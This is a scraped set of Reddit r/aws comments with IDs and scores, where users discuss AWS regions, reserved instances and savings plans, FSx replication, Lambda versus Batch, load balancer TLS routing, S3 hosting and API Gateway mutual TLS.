
* The instances are in the same Region.

* The instances are in the same VPC or peered VPCs, and the traffic does not pass through a virtual network device, such as a load balancer or a transit gateway.""

https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/data-protection.html

Also, if you like to understand more on how VPC works and how VPC handles stuff like multi tenency, Packet encapsulation etc  I really recommend ""Another day, another billion flows"" from re:invent: 

* https://www.slideshare.net/mobile/AmazonWebServices/another-day-another-billion-flows-net405-reinvent-2017

* https://m.youtube.com/watch?v=8gc2DgBqo9U",2.0
g5t05qp,ivqpg9,"All new regions (Hong Kong onwards) are referred to as opt-in, so as you noticed they’re disabled by default.

I believe the motivation is to allow account Admins to specify which regions resources can be created in. (This helps account owners enforce legislative requirements)  It’s not clear if we can expect this feature to be back ported to existing regions.

Ref:
https://docs.aws.amazon.com/general/latest/gr/rande-manage.html",6.0
g5t7xt2,ivqpg9,"Thanks, makes sense!",1.0
g5t0rg6,ivqpg9,"They're the newest ones I believe, so they are probably ""opt-in"" so that people in those regions can manually opt-in and get the advantages of really local AWS presence before it gets filled with customers who are just running their 7th tier failover systems. At some point when the capacity is completely built out I guess they would become generally available",0.0
g5tfwte,ivqpg9,Incorrect. u/throwawayyourdiggity stated the correct reason.,3.0
g5t0gbx,ivqpg9,"Can you please provide more details..
Like is this aws account a personal or your organization account etc.",0.0
g5t7z1b,ivqpg9,It's personal but it appears to be effective for every account,2.0
g5tfpsa,ivpay2,"DFS-R works, you just need to use PowerShell to set it up",1.0
g5u64ax,ivpay2,"It sort of depends what the end state here is - I wouldn't recommend using DataSync for bi-directional replication as I can see that going quite badly wrong as there's no conflict resolution (i.e. if a file is edited in AWS and on prem, who wins?)

I've used FSx and DFS-r as part of the proposed FSx-HA solution (before Multi-AZ was a thing) and it does work, but as /u/Papina said, you need to use PowerShell to set it up (see the AWS docs) and it _appears_ that you lose the ability to have Multi-AZ support on the AWS side. If it were me, I'd not sacrifice Multi-AZ for DFS-r support, but obviously it depends on your use case.

If you have an AWS account team (TAM or aligned SA, etc.) it might be worth a call to them to see what the FSx product team recommends - I've personally found them very helpful.",1.0
g62whek,ivpay2,"Hi, thx for your answers.
 I do have a meeting with an AWS SA today. Let's see what he comes up with.
How fast is your Internet connection and how is the user experience, when you go full cloud? I'm worried that the user will form a mob, if they have there fileserver cloud only.",1.0
g63vcom,ivpay2,"We're a bit different, we have DirectConnect links into AWS so can't comment about performance over a VPN/Internet. Ultimately it's going to depend on your use case though - are you editing 4K video all day long or do people open a spreadsheet, stare at it for 8 hours, and save once a day?

A good indication of requirements would be to look at throughput on your current (on prem) fileserver - doesn't even have to be that technical, open Performance Monitor and watch the network traffic over a few hours.",1.0
g5t03sk,ivo92v,https://aws.amazon.com/blogs/compute/introducing-the-c-lambda-runtime/,5.0
g5t42yj,ivo92v,"Agree on C++ lambda for what you're looking at. HPC would be for jobs that require low latency interconnect between processes. If the processes are independent, you'd be paying a premium for specialty networking that you're not using. EC2 spot instances could also work if your code won't run on lambda for some reason, and you don't care as much about when they're running.",2.0
g5twg72,ivo92v,"If your processes complete within 15 minutes I think Lambda would be the most ""cloud-native"" solution, but if you already have code that works on your local machine and you just want to utilize more cores than you would need to rewrite (or even re-architecture) parts of it for Lambda use case.

Batch with the multi-node job would indeed be a good solution for this as you can keep the same code (just dockerize it before) but again there is an additional effort.

The nice thing about those two, however, is that you would have logged on Cloudwatch, a nice web UI for you to examine, search later etc. 

That's why I think spinning up ec2 would be the quickest way for your code to get running, as there is really least number of steps needed. As for costs, if you use spot instance you might have similar prices as Batch (batch can be cheaper at the times if it utilizes spot pools).

&amp;#x200B;

Finally, I think EC2 approach should only be used if you are individually doing some experiments. If you work within any type of organisation, or at some point, others might be contributing to your code then there is tremendous value in documenting all possible (execution environment) details, where again Docker shines IMO.",1.0
g5t6qrr,ivo92v,"I think EC2 instance is the easiest, since it's just a one off job.

For batch I assume you would actually do a batch array job ( since the nodes don't interact)",-1.0
g5twkmu,ivo92v,"For batch it depends, maybe OP just wants to use many cores under central execution env.",1.0
g5t3a5f,ivny3v,"This really sounds like a Wordpress question, not an AWS question. Have you tried the forums for Wordpress or whatever Wordpress plugin you are using for this feature?",1.0
g5rtnk4,ivjhde,Highly recommend Compute Savings Plan. You get the same discount % but you can use whatever instance class you want.,9.0
g5s1wv2,ivjhde,This.,1.0
g5sc9se,ivjhde,"Yeah, saving plans is the new model for discounts, it was designed simple because reserved instances was to complicated.

But also, discount is biggest with reserved instance, around 5 to 8%.

Saving plan is better because it applies to EC2, ECS, Fargate an EKS",1.0
g5sl9r4,ivjhde,"And Lambda, and hopefully other things in the future",1.0
g5rrrzo,ivjhde,"If you're considering 3-5 year commitment, 3Y all up front savings plan will typically be the most cost effective solution and give you more flexibility.",3.0
g5rxsw0,ivjhde,"As mentioned in another comment, I recommend that you look at Compute Savings Plans. They give you the flexibility to use any Amazon EC2 instance family and size, AWS Fargate, or AWS Lambda as your needs change. It also gives you flexibility to use a different region. As your needs change, your Savings Plans will automatically be applied to the usage that gives you the highest discount.

In [Cost Explorer you can get recommendations](https://docs.aws.amazon.com/savingsplans/latest/userguide/sp-recommendations.html) based on your past usage.

Reserved Instances are still available for customers who have developed their cost control practices around them. I'll answer your specific questions to clarify.

&gt;If we look at the t2.small:

&gt;A Standard 1 Year Term, no Upfront means I am contracted to pay a minimum of $12.92 per month over 12 months which means I can only use that $12.92 a month on a t2.small but cannot upgrade or downgrade the instance?


&gt;A Standard 1 Year Term, All Upfront means I am contracted to pay $145 up front, which means I can then use a t2.small for 12 months but cannot upgrade or downgrade the instance.

With Standard Reserved Instances you can change the size, but you must stay within the same family. The reservations are applied based on a [normalization factor](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/apply_ri.html). This means that if you buy an RI for one t2.small, it will apply automatically to two t2.micro or four t2.nano or a combination. If you wanted to use a t2.medium the discount would apply to 50% of the cost of the instance, or you could buy another t2.small RI, and the two would combine.

&gt;A Convertible 1 Year Term, no Upfront means I am contracted to pay a minimum of $14.89 per month over 12 months but if I want to upgrade or downgrade the instance I can? What happens if I upgrade? What happens if I downgrade?

&gt;A Convertible 1 Year Term, All Upfront means I am contracted to pay $167 up front... the same above questions I have for this one.

With Convertible RIs, the same rules for size flexibility apply automatically. In addition, you can [exchange](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ri-convertible-exchange.html) them if you ever need to change family. 

For your questions, there's no difference between no upfront, partial upfront, and all upfront. It's up to you what payment plan works best for you.",3.0
g5rrrdl,ivjhde,"AWS allows you to change your reservation for Standard as follows:

\- you can modify instance size within the same instance family

\- you can split a larger instance into smaller instances (for e.g  t3.large = 4x t3.small) or merge smaller instances into a larger instance 

Whereas if you use a convertible RI you can also modify the instance family when you want to change the reservation. AWS charges more for convertible RIs because of this flexiblity. 

If you know beforehand that you won't be changing instance families, using a Standard is probably better.

As far as I understand, no upfront vs all upfront is mostly a billing construct and doesn't affect any of the functionality.

This guide might be helpful in understand more:

[https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ri-modifying.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ri-modifying.html)",1.0
g5rxln5,ivjhde,"All reservations have size flexibility. That means if you have a reservation for a small, but run a medium, you are half covered. You'll pay the reserved rate for half, and the on demand rate for the other hall. If you did the all upfront, you just pay the half on demand rate. It goes smaller too, one reservation for a medium instance can cover two smalls, or 4 micros. You don't have to make any adjustments to the reservations, they will be applied to instances you choose to run.

The convertible reservations would be useful if you think you might change between instance type families. For example, changing from t2 to t3, or to m5. In that case, you must convert the reservation to the new type. The new reservation must be a equal or greater value, so you may not be able to change back.",1.0
g5sjv88,ivj53c,"AWS SA here. 

Solutions Architects don't cost money to engage with. SAs offer advice, guidance, architecture recommendations, Well Architected reviews, some familiarization (I hesitate to call it Training) and so on. They don't get ""hands on keyboard"" though.

AWS has a Professional Services arm which does actual implementation work. AWS Partners can also help here, as others have said. These typically cost money to do project-type work. You might use them for a migration project, for example.

AWS also has a training team. Training courses are usually one or three day affairs, and do cost money. Some introductory courses can sometimes be available discounted or free, and there's a lot of free online self-paced training your team can avail themselves of at https://aws.training

I'd recommend getting started by reaching out to our sales teams. You can do this here: https://aws.amazon.com/websites/contact-us/",10.0
g5wtzax,ivj53c,Thank you for the detailed response. Professional services and the partner network sound interesting. So I can pay extra to AWS itself to have their professional services help me with hands on migrating and building? I know the partner network probably has a lot of offerings and I will look into that. I'm just curious how much hands on I can get from AWS itself.,2.0
g5x2t3d,ivj53c,"Yep, that's correct. The AWS Professional Services team are there to do things like hands-on migrations. Whether they're able to engage with you directly will depend on where you're located, complexity of the migration, etc.  
They way to start that conversation is via the Sales team, they can help you explore the options.",2.0
g5rwntg,ivj53c,"If you buy a lion you are going to need a lion tamer.

If r/aws was r/liontaming we'd get ""The lion bit off somebodys left arm so we decided to only use our right arms to feed him but hes still biting them off too. I called the guy I bought the lion off and he said that my support doesn't cover these issues"". By the way there is no budget to hire any lion tamers or companies. Thanks for any advice!",5.0
g5rp2j3,ivj53c,"Amazon isn’t going to help you in the way you think they are. The SA’s are there to provide guidance and best practices - not assist in a migration like “hands on keyboard writing scrips to move data to S3”. 

If you’re 250 employees, you’re probably going to need to look into a MSP that works in your space and has experience with AWS migrations. A few of them come to mind, but I don’t want to endorse any.",7.0
g5rv80t,ivj53c,"There are other teams such as professional services that actually can help plan migrations.
For an end to end experience, look for a partner with skills on migrations.",7.0
g5rr42k,ivj53c,"Thank you. I will learn more about MSP, which I assume is their partner network. 

Does AWS offer any training to get our employees up to speed outside of having them take certifications, which I will require?",1.0
g5t3hym,ivj53c,https://www.aws.training/,2.0
g5s3osb,ivj53c,If you have 250 engineers your likely on some local account managers list. Will AWS train you all? no. But they will support you ? Yes.  What kind of spend are you looking at? As that’s going to dictate how much support your going to get.,3.0
g5skytv,ivj53c,AWS has discount programs that includes partner funding and free usage of AWS. Definitely talk to AWS Sales.,2.0
g5soo0t,ivj53c,"AWS doesn't train or do hands-on - that's what their [Consulting Partner network](https://aws.amazon.com/partners/consulting/) is for - to help you find consultants who can assist you where you need it (also [lots of consultants](https://clutch.co/it-services/cloud) who haven't joined the AWS Partner Network - APN simply vets consultants to have a certain size, number of certifications and positive reviews from customers). The Support Plans are for things like, ""My production app is down and my web server can't connect to my database, and I don't know why ... please help fast!""

Your consulting costs will depend upon how much help you want and how complex your applications are, but a 250 person company might typically spend $25k to $500k on cloud architecture and migration.

It's important to realize that AWS is just a big box of legos. How you provision and govern those legos is entirely up to you. There are good ways to do it and really bad ways to do it. Really good to have some experienced AWS people at the start of this journey obviously. 

Also realize that the knowledge and tooling for governing AWS cloud is a continuously improving space. AWS environments created five years ago by consultants who might have charged a typical $250k bill can now be done for a $25k bill. This is important when choosing a consultant, as not all consultants are equally advanced and you can easily spend either figure to get the same result.",2.0
g5s7bkk,ivj53c,"AWS does offer these services, but costs might scale better for larger customers.   I agree with /u/_abhayshah, AWS parters might be better positioned to help a customer your size.",1.0
g5s7e1y,ivj53c,"Send a message to AWS Sales support.  They will refer you to a partner in your area that can help.  Unless you are a unicorn with a multi-million dollar monthly spend, you aren't going to be on the radar of anyone at AWS.  If you route your AWS bill though your partner they will get a small percent of your monthly spend (doesn't change your bill at all), which will help to offset the cost of assisting you.  You can then work with the partner to define project scope and get a cost for help.",1.0
g5sssjb,ivj53c,AWS does offer free digital training as well as private (virtual) classroom training: https://aws.amazon.com/training/,1.0
g5sdyy5,ivj53c,Yes,0.0
g5s0mil,ivj53c,"Shamless career plug. You could look into hiring someone with my sort of background, I have been migrating companies to the cloud for the past few years, I am always a direct hire, I do migration and stabilization, then I get bored and move on. Might be something you look into. Few cloud engineers or hire a MST like someone above mentioned, AWS customer support team/and SAs are about useless when it comes to actually helping you, Amazon does have suggested migration providers, that they will give you bonus credit if you use them. 
Down side of a MST is your team doesn't gain as much hands on knowledge of the infrastructure, as they would had they built the whole thing. 

As for down time, your team can plan for a cut over, that will in theory give you the ability to test the aws version before setting it as the live prod version.",0.0
g5ribfj,ivhs91,"
The easiest way is to serve them on different ports.",2.0
g5rq5dc,ivhs91,"Yes, you could serve them on the same instance with different ports. However, if you are already planning to use Docker containers for these services, ECS or Fargate might be a better option.

Learning to use docker for this seems like a good idea and you can then deploy the same docker container to AWS and run your services.",2.0
g5sdja0,ivhs91,"You can bind them to different ports, or even bind them to the same port using SNI to serve content on the same port but differ depending upon what domain name is being requested (using SSL certs)

Not really an AWS question, would have asked this in a different sub.",1.0
g5ti5cw,ivg5ff,What are you trying to do with the extra security group? I had to create my own security group and add it.,1.0
g5zf0v6,ivg5ff,"&gt;\_workspaceMembers security group

i need to add it to the directory.  it was created when i registered the directory which is by design.",1.0
g5zvmny,ivg5ff,"I believe the second group gets created when you register the directory in the WorkSpaces console. It's been a while since I checked exactly when it's created. The group you can specify in the directory properties is an additional group, it does not replace the _workspacesMembers group.",1.0
g63kvla,ivg5ff,"Yes, i know but doesn't need to be attached to the directory?  the only one that gets attached is the \_controller one.  i don't see the \_workspacemember security group when i go to attach it.",1.0
g668588,ivg5ff,The WorkSpacesMembers group is always attached. The one you specify in the directory settings is additional. The only way to set a workspace so that the members group is not attached is to directly modify the associated ENI (this is not recommended as it can cause issues),2.0
g67em5r,ivg5ff,is there a way to see which security groups a workspace is attached too?,1.0
g6b8gke,ivg5ff,"You can just look at the ENI in your VPC. You can do that via the console or cli/api. Just find the WorkSpaces IP and then look at the ENI with that IP. There may be other/better ways, but that's the first one that comes to mind.",1.0
g5rfd5u,ivhk63,"Usually, you don't want to store binary files in a database. You store all the meta information and the file, named something like &lt;primary_key&gt;.mp3, on something like S3.",5.0
g5rpes5,ivhk63,"Store the actual objects in S3, store metadata about the object (and its location) in a DB.",3.0
g5rqavh,ivhk63,"Store the files in S3 like others have recommended and if those files will be accessed frequently, put CloudFront (or any other CDN) in front of it to improve performance / reduce direct S3 access.",2.0
g5rcm1o,ivf22d,"If you think it was a problem on the AWS side, you can open a support ticket and they will check it out. If the Lambda SLA was breached you might be eligible for credits.",1.0
g5r56ul,ivf14s,"As a general rule, no, they don’t.

Your code on EC2 is yours.  You are simply renting server space. 

In fact, if you manage your own encryption keys, AWS would have no way to access the code on your EC2 instance. An unscrupulous employee might be able to access if you use AWS managed keys for your EBS encryption, but from what I’ve seen, their procedures are pretty tight for who can access such things, and I don’t even know if AWS support can access that information if you need them to.",5.0
g5r08dw,ivf14s,Check out the [official data privacy FAQ](https://aws.amazon.com/compliance/data-privacy-faq/).,4.0
g5r375f,ivf14s,"IANAL, but... of course not. By using their systems and tools you do not give up any of your intellectual property rights. They do not, and from my experience _will not and are specifically prohibited from_ looking at any customer data, sometimes even with explicit consent to do so. 

If you are seriously concerned that they would do this, you should take the time to read their legal docs — https://aws.amazon.com/legal/",4.0
g5rd1lj,ivf14s,Some of the biggest tech and non-tech companies in the world use AWS. Your code (and any other data) is safe.,3.0
g5qwh8a,ivf14s,"This is a question for lawyers. Also, for reading the terms of service.",3.0
g5r4268,ivclhz,"In the real world you don’t deploy from your IDE either. You have a CI/CD pipeline and you deploy with CloudFormation. 

Start here 

https://www.youtube.com/watch?v=CIdUU6rNdk4

The easiest way to get started with a complete CI/CD pipeline is by using CodeStar.",3.0
g5rnj3z,iveja2,This is fantastic.,8.0
g5u4qds,iveja2,how is this the first time I'm seeing this?!,2.0
g5sdcaz,iveja2,[How is this not an official AWS video?](https://www.youtube.com/watch?v=zMua0cuhFnc),7.0
g5t321j,iveja2,This should be something on their main website.,5.0
g5rzi42,iveja2,Well there goes all my free time.,3.0
g5s2sdo,iveja2,Thank you! So useful,2.0
g5ticep,iveja2,Thank you!!,1.0
g5tzupy,iveja2,"I’m not seeing a serverless category?

I’d also recommend [aws stash](https://awsstash.com/) if anyone wants to search for videos across re invent, online tech talks, summits",1.0
g5un9wn,iveja2,"Nice idea. Bad design. The responsive design cuts off the categories if your screen is too wide. 

https://i.imgur.com/Ljh06Of.png",1.0
g5svicb,iveja2,"No labels for each category, really?",1.0
g5tiacj,ivdy39,You should be able to check detailed output in the run command logs.,1.0
g5qlerl,ivbyxf,"Wouldn't it be easier to use a federated login to your existing login provider?

Either with or without AWS SSO.",6.0
g5qzou2,ivbyxf,"This and the ""previous"" post are encrypting user passwords for storage.

*Don't ever do this in practice*, it's begging for a large-scale compromise. Passwords should *never* be recoverable from a backend system. Run far, far away from this set of posts.",5.0
g5r1khh,ivbyxf,This is a horrible post with such bad advice in so many ways. Just use federated logins.,4.0
g5qgffu,ivbyxf,IAM Roles,1.0
g5poiik,iv8q0d,"This is specifically geared for GovCloud (thus the template is deployed in GovCloud), but can be easily repurposed for old fashioned Commercial. 

If you've had to create GovCloud accounts and link them, it is a huge pain. This CloudFormation script deploys into AWS GovCloud and creates an AWS Step Function that accepts

`{ ""email"": ""some-email@example.com"", ""name"": ""The Account Name"" }`

As an input. It will generate the GovCloud accounts then link them after creation

Hope this saves others frustration and time.",1.0
g5q4m16,ivaydr,"What is the exact URL you're using to access your CloudFront distribution?

If you issued a certificate for `*.mydomain.com` only, then [`mydomain.com`](https://mydomain.com) is not valid. This is intended behaviour.",2.0
g5q60df,ivaydr,"the url is -&gt; [https://mydomain.com](https://mydomain.com)

this means that when I request a certificate I need to request 

[**mydomin.com**](https://mydomin.com) and **\*.mydomain.com** ? I tried this, but the the only problem with this is that the DNS entries for validating the certificate are exactly the same....",1.0
g5qbru4,ivaydr,"Yeah, if you want to access it without the `www` (or any other prefix) then you need a certificate for [`mydomain.com`](https://mydomain.com)

I'm not sure what your issue is with DNS? You need to validate that you own the domain [`mydomain.com`](https://mydomain.com) and then you can issue any certificates relating to it. So you only need one record that would validate both of those names on a single certificate (i.e. as Subject Alternate Names)",2.0
g5qk8zr,ivaydr,"Got it, thank you... for the DNS, I though it should be a different DNS value foe each subdomain.... all food now :) thank you",1.0
g5pvk8t,iv9q9i,"Hi,  
I wrote this medium article to highlight what I wish I knew before going with Amplify. The article itself appears mostly negative because I'm mainly highlighting the challenges I had to overcome. I'm by no means an Amplify / AWS expert but found it might be useful to highlight some of my roadblocks for those of you who are considering Amplify.",5.0
g5qdrar,iv9q9i,"Hi//u/aldonley, your point about resolvers is less of an issue now that Amplify supports [direct Lambda resolvers](https://dev.to/aws-builders/direct-lambda-resolvers-with-aws-amplify-and-appsync-2k3j). This means no more VTL, which I can imagine alleviates a large amount of pain.",4.0
g5qn3jw,iv9q9i,right now I'm working on an Amplify app and you are spot on. I wish we did it with api gatewayv2 HTTP + s3 + cloudfront.,2.0
g5tkk8f,iv8q41,Look into AWS SSM port forwarding instead of bastion hosts.  You may need a small host to tunnel through.,2.0
g5uym24,iv8q41,"Thanks, will take a look.",1.0
g5puec4,iv8q41,"If you like managed solutions and are willing to pay the price, AWS solution for this is Client VPN endpoint. It acts as VPN and bastion at the same time - when connected to the VPN, you can access the VPC private IPs without connecting to bastion instance.

I am using this with certificate authentication and it works pretty well.

https://docs.aws.amazon.com/vpn/latest/clientvpn-admin/cvpn-working-endpoints.html",1.0
g5qaqis,iv8q41,"Thanks u/kembalisimo. I did look into this as well and it looks like it would fit our needs, but was looking for a lower priced solution.",1.0
g5pbvkz,iv6d4n,if it has permissions for role attachment sure,1.0
g5pflyc,iv6d4n,Would the role be sent from the from the Linux server to the EC2 over CLI?,1.0
g5pkq12,iv6d4n,no,1.0
g5pltpz,iv6d4n,"When you launch the other instances from the CLI, you can ""send"" the role to the other instances by giving the other instances an instance profile that has the role you want the other EC2s to assume. When those instances come up, then they'll have all the permissions of the role.",1.0
g5pni9l,iv6d4n,The role to apply to the EC2 instances is defined as part of the EC2 configuration.  When you start the instance you tell it what role to use for applications running on that instance.,1.0
g5qylrn,iv6d4n,Your should set the IAM role plus instance profile for passing it to the ec2,1.0
g5pudyy,iv15s0,"OK, I went in with low expectations but this was absolutely amazing and so on point.",3.0
g5q9sww,iv15s0,This is great,3.0
g5tknku,iv15s0,"I like the supporting chorus (left to right):

* event bridge
* lambda
* api gateway
* dynamodb

Plus, their colors mostly match the AWS architecture icons ([https://aws.amazon.com/architecture/icons/](https://aws.amazon.com/architecture/icons/)).

Well done!",2.0
g5w7pc5,iv15s0,This is so well done...im curious who it was created for? Seems too well produced to just be a fun side project.,2.0
g5p2dsi,iv4gen,Thanks. I worked very hard on this.,21.0
g5p7nd7,iv4gen,Woohoo!!,3.0
g5qelxv,iv4gen,Need a limit increase!,3.0
g5po9m5,iv4gen,"Kudos, it's a nice subreddit.

I learn a lot, and I think I can help others too.",2.0
g5ozc1z,iv4gen,"Alternatively, condolences to all the people coming here looking for the M to RTF.",4.0
g5q1rz3,iv4gen,?,2.0
g5q3rpz,iv4gen,Manual to Read The Fucking...,4.0
g5q7ekh,iv4gen,Yeah I learn great tips every time I peek in.  Thanks for keeping a tight ship.,1.0
g5qbp1m,iv4gen,And I just passed my  CCP this morning 🎉,1.0
g5sv397,iv4gen,Woo super ...,1.0
g5qdyyy,iv0yyr,"Not a lot of info here.  How do you know the schemas are 'offline'?  What error are you gettin?

You're running RDS?  Not a MySQL installed on an EC2, correct?  And you're running MySQL, not Aurora/MySQL, correct?",1.0
g5ozmhi,iv4ex9,***Finally*** have been wanting this feature forever!,8.0
g5pe059,iv4ex9,now do the alb!,5.0
g5qbt2c,iv4ex9,and the nlb,1.0
g5qr5zw,iv4ex9,Can someone explain the use cases for this? I know the article mentioned b2b but when would you use this and is there a reason to not use it or should it always be enabled?,4.0
g6auc5h,iv4ex9,"For anyone interested this is what I found 
https://medium.com/contino-engineering/mtls-auth-with-aws-api-gateway-9bbd619f7de4",1.0
g5qorve,iv4ex9,This should enable smart-card auth for serverless without a SAML intermediary too!,2.0
g5owi4h,iuz9by,"An application load balancer (ALB) is what you’re after, with the certificate issued by ACM. The ALB can do host based routing, so you can have a rule that says first name-lastname.demo.cloud goes to target group A which contains instance A, a different rule to route to target group B / instance B, etc. For ACM, you can generate a wild card certificate and apply that to the load balancer. If you want to do end to end TLS and encrypt the connection between the load balancer and the backend server, any old certificate will do just fine (including self signed) as load balancers don’t validate the certificate.

In terms of cleanup, you could use Lambda to run via cloud watch events on a schedule to periodically perform whatever tasks you need done.

For the automated creation of each environment, check out something like terraform, cloud formation or even the AWS cli. It should help with your approach of running a script and simply passing in some variables for each new student.

Hopefully that gives you all the right terms to start searching on! Welcome to the cloud, old timer!",5.0
g5p5ycq,iuz9by,"You can store your resources in CloudFormation, a stack per user, and just terminate the stack after the tutorial.

On the tls side, ALB was mentioned, but I'd also recommend NLB, which has also added TLS support, or API Gateway, which may be useful in other parts of your training course.",1.0
g5ugdff,iuz9by,"These are great!  Thanks everyone, I’ll post back once I’ve done some research on totally hacked some embarassingly terribly architected solution that works!",1.0
g5otnrq,iuyyvp,"Free Tier usage can be tracked at the billing console for your account: [https://console.aws.amazon.com/billing/home#/freetier](https://console.aws.amazon.com/billing/home#/freetier)

Not sure if Rekognition is in there as we do not use that service, but I would think so.

Edit: Guess it should be according to 'Trackable services' in the docs: [https://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/tracking-free-tier-usage.html](https://docs.aws.amazon.com/awsaccountbilling/latest/aboutv2/tracking-free-tier-usage.html)",1.0
g5ooeex,iv2a12,"You do not need internet access for the standard repos. Only if you add some extra stuff not mirrored in S3. 

Move the instance to a private subnet without an Internet route and see for yourself.",3.0
g5pzy7y,iv2a12,"I did attempt this , and was unable too still. I used a fresh AmazonLinux2 instance w/out an Elastic IP address. I dont have a Nat Gateway, therefore the instance has no way to route out the internet.  Still timeout errors on yum update and still, if i dig, pointing to a mirror hosted on a Duke Uni server. Ill try again and maybe spring for Dev Support plan to chat with aws. 

Do you have this working , and if so what Amazon Linux AMI are you using? I use this stuff at work so I have a fair amount of exp. all my NACLs/SG/VPC Endpoints are setup correctly.",1.0
g5q4c6f,iv2a12,"You are correct. The problem is that I was using the AmazonLinux2 w/DotNet ami which has repos that appearently are not in AWS's own S3 buckets. That seems like it wouldnt take that much work for AWS to setup their own mirrors in S3, that way traffic would never have to leave PrivateLink. Maybe ill put in a feature request.",1.0
g5on9i9,iv20gc,Are you using an arm ami? Or an x86?,3.0
g5onbzc,iv20gc,"x86

Edit: oooooooooooh, ok. Thanks for pointing that out !",1.0
g5ot31u,iv20gc,"You have to select an Arm-compatible AMI (like Ubuntu 64-Bits Arm). On the launch wizard, quick-start, on the right side you select which architecture you want.",1.0
g5p08kb,iuzjwd,An API you want to map to a custom domain must be deployed in the same account as the custom domain.  Custom domains can’t currently be shared across accounts.,3.0
g5pmfd6,iuzjwd,"Got it, good to know. Thank you 🙏",1.0
g5pn6y1,iuzjwd,"I should have expanded a bit on this.  The API implementation (your app running on lambda, EC2, etc) can be in a remote account.  Only the API gateway deployment must be in the same account as the custom domain.",1.0
g5prcsf,iuzjwd,"Interesting, yet as far as I understand HTTP APIs don't have the same type of deployment I think?

By the way I thought it might be possible to use domains across account's like SES using policies (I'm still figuring out how all those access rights play together 😅) https://aws.amazon.com/de/about-aws/whats-new/2015/07/amazon-ses-now-supports-cross-account-sending/

I'm using different domains now, which is fine too 🤷🏻‍♂️",1.0
g5og3yp,iuzjwd,Export ACM cert and import to other account?,1.0
g5ogdr8,iuzjwd,Hm not sure what you mean? The cert is not the issue. I want to add an API mapping (via Pulumi/Infrastructure as Code) from another account's API Gateway to the infra account's custom domain. Maybe it just doesn't make sense 🤔🤷🏻‍♂️😅,1.0
g5o7ahs,iuyqkh,"API GW (HTTP API), Step Functions to manage your workflow (use express if it take less than 5 min), Lambda, S3,  Possibly DynamoDB, and maybe SNS if you want to get send a notification. I’m not as familiar with the authentication side",1.0
g5o7vkr,iuyqkh,"A basic CRUD web app(say with Django, Spring, Rails) and then deployed on elastic beanstalk? 
There’s a lot of ways this could be done. But that’s one. Edit: dynamo for persistence.",1.0
g5p1kk5,iuyqkh,"AWS Amplify is an easy way to get started writing dynamic web and mobile apps that scale with you. Like you mentioned it supports static sites and uses Amazon S3 for static content in dynamic sites.

It's a good choice of you're comfortable developing dynamic sites in JavaScript. It has integrations with popular frameworks such as React, Vue, Angular, Next.js, and Ionic. In the backend it helps you build a GraphQL model with AWS AppSync, Amazon DynamoDB, AWS Lambda, Amazon Cognito, and other services you want to integrate with.

For your use case, the most important thing to consider would be how to manage the PDF creation step. I see a few interesting options.

Could you have the client side app request the relevant data and generate the PDF in JavaScript? A quick search showed pdfkit and jspdf as possible options you could explore to generate a PDF from html generated by your app.

The other option is to generate it in an AWS Lambda function. How long does it take to create a PDF in the worst case? AWS AppSync has a 30 second timeout for integrations.",1.0
g5rgy6q,iuyqkh,"Thanks this is great. Though my concern is that AWS Amplify only supports static websites. This is new to me but my understanding is this site would be dynamic (though not much) since some of the content would be based on who was logged in. 

Am I wrong in that amplify only supports static?",1.0
g5rsrif,iuyqkh,AWS Amplify supports dynamic sites.,1.0
g65iups,iuvhk9,"Hi, following up on this. Thanks.",1.0
g5nzr5h,iuxyxo,"If you have to do www.yourdomain.com/certs then I believe your only option would be to redirect from your webserver hosting www.yourdomain.com which i image defeats the whole idea.

However You can easily do certs.yourdomain.com via dns and then since these are just static files just host them in an S3 bucket and point dns to the bucket.  No server to deal with at all.",2.0
g5o15xu,iuxyxo,"Is there any way to redirect www.[ourdomain.com/certs](https://ourdomain.com/certs) to an S3 bucket?

If we change the URL to certs.ourdomain.com, then all the certificates would have to be reissued with the the new path to locate crls.

We want to have full control over accessing these files rather than relying on maintaining access to a web server managed by another team.",1.0
g5o2pu9,iuxyxo,"You can but it would be using a redirect on your webserver either a web redirect web page or a redirect in your web.config since I think you said you were windows.  If linux then .htaccess.  either way you would need to do the redirect from your current webserver. So it sounds like your other team would have to set it up.

 Thus every request would still need to go first to your webserver and then be redirected to the S3 bucket.  

 However if your goal is to absolutely move the files then the other team would need to setup a redirect on your current server.",1.0
g5o3nm7,iuxyxo,"The certificate authority server generating the files we need to post is running  Windows Server. However, the web server hosting [www.ourdomain.com](https://www.ourdomain.com) and therefore also [www.ourdomain.com/certs](https://www.ourdomain.com/certs)  is likely Linux and is at an external cloud provider managed by another team in our company.

We want to ask them to redirect only the directory we need access to over to an S3 bucket we have control over so that we can manage those files ourselves without having to get access to the the main web servers.

So, what would we ask them to do to make this work?  What would they need to do to send just the specific URL subdirectory over to an S3 bucket that we specify?",1.0
g5o596o,iuxyxo,Like I stated they would need to edit the web.config or .htacces file depending on which type of webserver.  They would have to setup redirection in that file so that requests to www.yoursomain.com/certs would now go to the S3 Bucket. You should just be able to ask them to redirect to S3 if they support the webserver I am sure they would know how to setup a redirect.,1.0
g5o5jnz,iuxyxo,"Thanks.  By the way, what does an address to an S3 bucket look like (format)?",1.0
g5p2hvb,iuxyxo,"Like any web address. T h etc are actually two styles though.

https://my-bucket.s3.us-west-2.amazonaws.com

And

https://s3.Region.amazonaws.com/bucket-name/key name",1.0
g5p647a,iuxyxo,You can put [CloudFront](https://aws.amazon.com/premiumsupport/knowledge-center/cloudfront-https-requests-s3/) in front of your S3 bucket,1.0
g5oab0c,iuv2r4,"Null/empty value means it'll be what Postgres uses by default, which I think is -1 (meaning off). 

If you want to see what Postgres has set it to run something like:

```
select * from pg_settings where name = 'log_min_duration';
```",2.0
g5ngt6u,iuucnp,"No, you can build your own in aws though.",2.0
g5nh7zf,iuucnp,"Haven't found much to do so. So far two plugins come up from easy digital downloads or woocommerce that work with s3 buckets.

Interesting on the downvotes. I guess some don't like this post.",-5.0
g5njoyt,iuucnp,"It's a little like asking if Home Depot sells new houses. They don't, but they can provide all of the building materials for you to do it yourself.",6.0
g5nk3ev,iuucnp,"why reinvent the wheel if there are others doing it with aws?

Problem with aws is your right there is so many ways. I just needed some ideas. Thanks",-5.0
g5ogyeg,iuucnp,"No offense, and I could be wrong, but you don’t sound like you know what you’re doing or how to use the tools in front of you.

